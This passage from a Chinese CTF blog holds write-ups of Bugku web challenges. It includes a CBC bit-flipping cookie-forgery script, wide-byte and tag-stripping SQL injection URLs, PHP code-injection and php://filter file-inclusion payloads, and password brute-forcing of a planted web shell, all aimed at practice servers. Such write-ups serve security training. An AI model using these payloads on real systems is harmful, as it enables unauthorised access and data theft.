show_homepage();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这一段代码是跟根本不可能得到flag的，因为$info里是不能出现<code>admin</code>的，<br>所以重点就在else里的<code>show_homepage</code>了，cookie可控，开始解题<br>首先我们使用<code>admi2</code>,<code>haha</code>登录进去，这里已经产生了cookie:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-10-15/70947478.jpg" alt="" title="" class="">                <p></p>            </figure><p>先序列化一下<code>$info</code>这个数组然后分个组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admi2&quot;;s:8:&quot;password&quot;;s:4:&quot;haha&quot;;&#125;</span><br><span class="line"></span><br><span class="line">a:2:&#123;s:8:&quot;userna</span><br><span class="line">me&quot;;s:5:&quot;admi2&quot;;</span><br><span class="line">s:8:&quot;password&quot;;s</span><br><span class="line">:4:&quot;haha&quot;;&#125;</span><br></pre></td></tr></table></figure><p>接下来要做的就是更改cookie，使得<code>session[&#39;username&#39;]=admin</code>,同样借助一下大佬的脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">from urllib import unquote</span><br><span class="line">from urllib import quote_plus</span><br><span class="line"></span><br><span class="line">cipher = &apos;*********&apos; #这里写cookie中的cipher</span><br><span class="line">cipher = unquote(cipher)</span><br><span class="line">cipher_de = base64.b64decode(cipher)</span><br><span class="line">ch = chr(ord(cipher_de[13]) ^ ord(&apos;2&apos;) ^ ord(&apos;n&apos;)) #这里根据用户名可以稍作改变13对应的是第一组的13位于第二组的2进行运算</span><br><span class="line">cipher_de=cipher_de[0:13]+ch+cipher_de[14::]</span><br><span class="line">rs = base64.b64encode(cipher_de)</span><br><span class="line">print quote_plus(rs)</span><br></pre></td></tr></table></figure><p>然后用得到的cipher替换掉之前的，然后在URL栏按回车，此时会提示你刚刚替换的cipher不能反序列化，这个地方出现的原因是由于第一组变了，解密之后与之前的不一样，所以提示失败<br>接下来要做的就是将IV也替换掉，使得解密后能被反序列化，再一次的借助大佬的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">from urllib import unquote</span><br><span class="line">from urllib import quote_plus</span><br><span class="line"></span><br><span class="line">mingwen_de=&apos;x2FPwTAFf/svVLvvU25fDW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjA6IiI7fQ==&apos;</span><br><span class="line">#base64_decode(&apos;这里面的&apos;) can&apos;t unserialize</span><br><span class="line">mingwen = base64.b64decode(mingwen_de)</span><br><span class="line">print mingwen</span><br><span class="line"></span><br><span class="line">iv = &apos;6S%2FcC7czBRvE0iSkTANYaQ%3D%3D&apos;</span><br><span class="line">#此时cookie里的iv</span><br><span class="line">iv = unquote(iv)</span><br><span class="line">iv_de = base64.b64decode(iv)</span><br><span class="line">new = &apos;a:2:&#123;s:8:&quot;userna&apos;</span><br><span class="line">for i in range(16):</span><br><span class="line">    iv_de = iv_de[:i] + chr(ord(iv_de[i]) ^ ord(mingwen[i]) ^ ord(new[i])) + iv_de[i+1:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(base64.b64encode(iv_de))</span><br><span class="line">#用这个结果把原来的iv换掉</span><br></pre></td></tr></table></figure><p>然后就得到flag了，</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-10-15/89125130.jpg" alt="" title="" class="">                <p></p>            </figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Web-2&quot;&gt;&lt;a href=&quot;#Web-2&quot; class=&quot;headerlink&quot; title=&quot;Web(2)&quot;&gt;&lt;/a&gt;Web(2)&lt;/h1&gt;&lt;h2 id=&quot;md5-collision-NUPT-CTF&quot;&gt;&lt;a href=&quot;#md5-collision-NUP
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
  </entry>
  
  <entry>
    <title>bugku writeup(Web1）</title>
    <link href="http://yoursite.com/2018/06/06/bugku/"/>
    <id>http://yoursite.com/2018/06/06/bugku/</id>
    <published>2018-06-06T08:10:51.000Z</published>
    <updated>2018-10-16T07:39:24.969Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web-1"><a href="#Web-1" class="headerlink" title="Web(1)"></a>Web(1)</h1><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>滑稽，F12查看源，得到flag：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/96118525.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="文件上传测试"><a href="#文件上传测试" class="headerlink" title="文件上传测试"></a>文件上传测试</h2><p>题目提示：<br>请上传PHP文件，文件上传大小不允许超过1M<br>试了几次之后，当上传php文件时提示非图片文件，<br>上传图片时，提示非php文件，打开burpsuite，<br>将一个php文件的后缀加上.jpg，上传时将.jpg删掉再上传即可<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/21608635.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>题目给出的输入框限制了最大输入长度，<br>F12将最大长度限制删掉就行.<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/23490301.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h2><p>这题有基础的都知道怎么做：<br>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$what=$_GET[&apos;what&apos;];</span><br><span class="line">echo $what;</span><br><span class="line">if($what==&apos;flag&apos;)</span><br><span class="line">echo &apos;flag&#123;****&#125;&apos;;</span><br></pre></td></tr></table></figure></p><p>将what提交了就行<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/28633444.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h2><p>跟上题一样:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/79911845.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$num=$_GET[&apos;num&apos;];</span><br><span class="line">if(!is_numeric($num))</span><br><span class="line">&#123;</span><br><span class="line">echo $num;</span><br><span class="line">if($num==1)</span><br><span class="line">echo &apos;flag&#123;**********&#125;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>代码意思是当num不是个数字并且值等于1的时候输出flag：<br>payload:<code>URL?num=1x31</code><br>提交拿到flag</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>打开的时候阻止页面创建对话框<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/16696183.jpg" alt="" title="" class="">                <p></p>            </figure><br>查看源码，<br>在最底下有串代码<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/31661363.jpg" alt="" title="" class="">                <p></p>            </figure><br>html码得到flag<br>附上<a href="http://www.convertstring.com/zh_CN/EncodeDecode/HtmlDecode" target="_blank" rel="noopener">解码连接</a><br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/50555689.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>这题是宽字节注入：<br>原理：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GBK 占用两字节</span><br><span class="line">ASCII占用一字节</span><br><span class="line">PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），</span><br><span class="line">MYSQL默认字符集是GBK等宽字节字符集。</span><br><span class="line">大家都知道%df’ 被PHP转义，单引号被加上反斜杠\，</span><br><span class="line">变成了 %df\’，其中\的十六进制是 %5C ，</span><br><span class="line">那么现在 %df\’ =%df%5c%27，</span><br><span class="line">如果程序的默认字符集是GBK等宽字节字符集，</span><br><span class="line">则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，</span><br><span class="line">也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</span><br></pre></td></tr></table></figure></p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=%df%27 union select 1,string from sql5.key%23</span><br></pre></td></tr></table></figure></p><p>首先，在url栏输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=%df%27</span><br></pre></td></tr></table></figure></p><p>报错了,说明可以注入<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/35293242.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>继续查看可显字段和库名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=%df%27 union select 1,database()%23</span><br></pre></td></tr></table></figure></p><p>告诉你查询key表里id=1的字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=%df%27 union select 1,string from sql5.key%23</span><br></pre></td></tr></table></figure></p><p>得到flag</p><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>hint：<br><code>听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag</code><br>直接改host就行，这里用火狐一个插件直接改访问的host就行<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/24899388.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>直接拿到flag</p><h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p>过滤代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//过滤sql</span><br><span class="line">$array = array(&apos;table&apos;,&apos;union&apos;,&apos;and&apos;,&apos;or&apos;,&apos;load_file&apos;,&apos;create&apos;,&apos;delete&apos;,&apos;select&apos;,&apos;update&apos;,&apos;sleep&apos;,&apos;alter&apos;,&apos;drop&apos;,&apos;truncate&apos;,&apos;from&apos;,&apos;max&apos;,&apos;min&apos;,&apos;order&apos;,&apos;limit&apos;);</span><br><span class="line">foreach ($array as $value)</span><br><span class="line">&#123;</span><br><span class="line">if (substr_count($id, $value) &gt; 0)</span><br><span class="line">&#123;</span><br><span class="line">exit(&apos;包含敏感关键字！&apos;.$value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//xss过滤</span><br><span class="line">$id = strip_tags($id);</span><br><span class="line"></span><br><span class="line">$query = &quot;SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1&quot;;</span><br></pre></td></tr></table></figure></p><p>注入的关键词几乎都过滤了，但是看到后面有个xss过滤。<br>查资料发现strip_tags（）函数会去除字符串里的html和php标签，<br>思路是先在payload里插入html标签绕过sql的过滤，<br>然后再用xss的过滤去除html的标签：</p><p>想通之后很简单，就是常规的sql注入,<br>得到数据库名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=-1%20uni%3C%3Eon%20sel%3C%3Eect%201,databa%3C%3Ese()%23</span><br></pre></td></tr></table></figure></p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,hash fr&lt;&gt;om sql3.key %23</span><br></pre></td></tr></table></figure></p><p>查找表为key的数据表，id=1值hash字段值，得到flag</p><h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>这题是不停的刷新页面，用burpsuite抓包就行：<br>多go几次就能拿到flag：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/8440547.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p>括号闭合的思路，payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8003/index.php?hello= 1);print_r(file(&quot;./flag.php&quot;)</span><br></pre></td></tr></table></figure></p><p>在服务器上执行的代码是(var_dump(hello=1);print_r(file(“./flag.php”));//<br>得到flag：<br>flag{bug-ctf-gg-99}</p><p>反括号`在linux下起着命令替换的作用。命令替换是指shell能够将一个命令的标准输出插在一个命令行中任何位置。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost sh]# echo The date is `date` </span><br><span class="line">The date is 2011年 03月 14日 星期一 21:15:43 CST</span><br></pre></td></tr></table></figure></p><p>单引号、双引号用于用户把带有空格的字符串赋值给变量事的分界符。如果没有单引号或双引号，shell会把空格后的字符串解释为命令。<br>单引号和双引号的区别。单引号告诉shell忽略所有特殊字符，而双引号忽略大多数，但不包括$、\、`。<br>例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost tmp]# echo ‘the date is `date`’ </span><br><span class="line">the date is `date` </span><br><span class="line">[root@localhost tmp]# echo “the date is `date`” </span><br><span class="line">the date is Fri Oct 9 00:11:56 CST 2015</span><br></pre></td></tr></table></figure></p><p>eval( “var_dump($a);”);正是双引号！！！我们就可以用`了！<br>然后用cat读取输出即可！</p><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>某春秋原题。<br>flag In the variable !<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8004/index1.php?args=GLOBALS</span><br></pre></td></tr></table></figure></p><p><a href="http://blog.csdn.net/qq_35078631/article/details/62438259" target="_blank" rel="noopener">参考资料</a></p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>jsfuck<br>右键查看源代码：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-14/20293186.jpg" alt="" title="" class="">                <p></p>            </figure><br>复制下来，F12放到控制台回车，得到flag：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/1983962.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>看这个名字就感觉flag在响应头里：<br>F12查看一下响应头，得到flag<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/80220355.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>首先题目没有给什么提示，也没有<code>.bak`</code>robots<code>等东西，所以直接上御剑扫描，然后扫到了一个</code>shell.php<code>，进去发现是一个大马，但是没有地方给密码，试了几个密码不行之后发现不行，没有验证码，直接爆破，出来之后发现密码是</code>hack`，直接得到flag</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>题目提示查看源代码，<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/16462625.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>进行了URL编码，<br>p1解码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function checkSubmit()&#123;var a%3ddocument.getElementById(&quot;password&quot;)%3bif(&quot;undefined&quot;!%3dtypeof a)&#123;if(&quot;67d709b2b</span><br></pre></td></tr></table></figure></p><p>p2解码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa648cf6e87a7114f1&quot;%3d%3da.value)return!0%3balert(&quot;Error&quot;)%3ba.focus()%3breturn!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit%3dcheckSubmit%3b</span><br></pre></td></tr></table></figure></p><p>大概意思就是提交的值与<br>p1里面那段值加上<code>54aa2</code>再加上p2里的值相同就行<br>拼接起来提交就行：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/48961816.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>点进去，看看URL<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/98855012.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>一个文件包含的题，直接拿php伪协议试：<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8005/post/index.php?file=php://filter//read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p><p>base64解码之后得到flag：<br>flag{edulcni_elif_lacol_si_siht}</p><h2 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h2><p>输入5位数密码，直接爆破<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/41498063.jpg" alt="" title="" class="">                <p></p>            </figure><br>得到flag</p><h2 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h2><p>查看源代码:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/38810373.jpg" alt="" title="" class="">                <p></p>            </figure><br>当clicks大于1000000时，能拿到flag<br>F12控制台输入clicks=100000000000回车即可得到flag</p><h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>备份文件获取，将<code>index.php.bak</code>下载下来，<br>查看源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);</span><br><span class="line">$str = substr($str,1);</span><br><span class="line">$str = str_replace(&apos;key&apos;,&apos;&apos;,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line">echo md5($key1);</span><br><span class="line"></span><br><span class="line">echo md5($key2);</span><br><span class="line">if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    echo $flag.&quot;取得flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>php弱类型比较，在url栏输入：</p><p><code>URL?key1=QNKCDZO&amp;key2=240610708</code></p><p>发现没啥反应，然后看了看源码，发现过滤了<code>key</code><br>双写key绕过，提交得到flag<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web16/index.php?kekeyy1=QNKCDZO&amp;kkeyey2=240610708</span><br></pre></td></tr></table></figure></p><h2 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h2><p>直接访问：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-14/12155851.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>很明显是算不到这么快的。<br>只能写脚本了。<br>附上python脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = &apos;http://120.24.86.145:8002/qiumingshan/&apos;</span><br><span class="line">s = requests.Session()</span><br><span class="line">source = s.get(url)</span><br><span class="line">expression = re.search(r&apos;(\d+[+\-*])+(\d+)&apos;, source.text).group()</span><br><span class="line">result = eval(expression)</span><br><span class="line">post = &#123;&apos;value&apos;: result&#125;</span><br><span class="line">print(s.post(url, data = post).text)</span><br></pre></td></tr></table></figure></p><p>这里有个正则匹配来匹配给出的表达式，<br>然后直接用eval计算。<br>最后将<code>value</code> <code>post</code>即可得到flag，<br>但是计算出的表达式长度不一样，可能会超过php的最大长度<br>所以需要多试几遍。<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-14/19420139.jpg" alt="" title="" class="">                <p></p>            </figure></p><h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>打开来什么都没有，就是一个你得快点：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-14/86374868.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>查看源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- OK ,now you have to post the margin what you find --&gt;</span><br></pre></td></tr></table></figure></p><p>有一段提示，<code>post</code> <code>margin</code>变量what i find<br>打开bp抓包：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-14/87281166.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>响应头中有个flag,<br>base64之后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跑的还不错，给你flag吧: NjM4NzUy</span><br></pre></td></tr></table></figure></p><p>估计是把 <code>NjM4NzUy</code>提交上去就行了,<br>但是后面发现还得把<code>NjM4NzUy</code>解一次base64：<code>638752</code><br>这个后面再说原因。<br>直接上python脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import re</span><br><span class="line">url=&apos;http://120.24.86.145:8002/web6/&apos;</span><br><span class="line">a=requests.session()</span><br><span class="line">r=a.get(url)</span><br><span class="line">FLAG=r.headers[&apos;flag&apos;]</span><br><span class="line">p=re.match(&apos;(.*)(: )(.*)&apos;,base64.b64decode(FLAG))</span><br><span class="line">payload=&#123;&apos;margin&apos;:base64.b64decode(p.group(3))&#125;</span><br><span class="line">r=a.post(url,data=payload)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></p><p>得到flag:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-14/21828555.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>这里可以看到我的脚本用了两次base64，<br>如果只用一次的话，题目会提示<code>你需要再快点</code>，具体的这里就不试了<br>同时给出php的脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = &quot;http://120.24.86.145:8002/web6/&quot;;</span><br><span class="line">    $contents = file_get_contents($url);</span><br><span class="line">    $header_arr = get_headers($url);</span><br><span class="line">    $cookie = $header_arr[5];</span><br><span class="line">    $cookie = explode(&apos;:&apos;,$cookie)[1];</span><br><span class="line">    $cookie = explode(&apos;;&apos;,$cookie)[0];</span><br><span class="line"></span><br><span class="line">    $flag = $header_arr[9];</span><br><span class="line">    $flag = explode(&apos;:&apos;,$flag)[1];</span><br><span class="line"></span><br><span class="line">    $flag = base64_decode($flag);</span><br><span class="line">    $flag = explode(&apos;: &apos;,$flag)[1];</span><br><span class="line">    $flag = base64_decode($flag);</span><br><span class="line"></span><br><span class="line">    $post_data = array(&quot;margin&quot;=&gt;$flag);</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);</span><br><span class="line">    curl_setopt($ch,CURLOPT_COOKIE,$cookie);</span><br><span class="line">    curl_setopt($ch,CURLOPT_POSTFIELDS,$post_data);</span><br><span class="line">    $output = curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line"> </span><br><span class="line">    print_r($output);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h2 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="cookies欺骗"></a>cookies欺骗</h2><p>打开题目看到一堆乱码，<br>但是URL栏看到那个<code>filename</code>，估计是个base64，<br>解码之后果然：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/35684580.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>但是前面还有个参数<code>line</code>，行的意思，一开始不知道这个参数有什么用，<br>多试了几次：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web11/index.php?line=0&amp;filename=a2V5cy50eHQ=</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/55573167.jpg" alt="" title="" class="">                <p></p>            </figure><p>当<code>line</code>=0，1，2等数的时候，对应着文件的0，1，2行<br>所以这个时候我们要做的是就是把<code>index.php</code>这个文件读到，<br>首先将<code>index.php</code>base64转码：<code>aW5kZXgucGhw</code><br>然后写个脚本将<code>line</code>从0~40遍历一次，<br>附上php脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 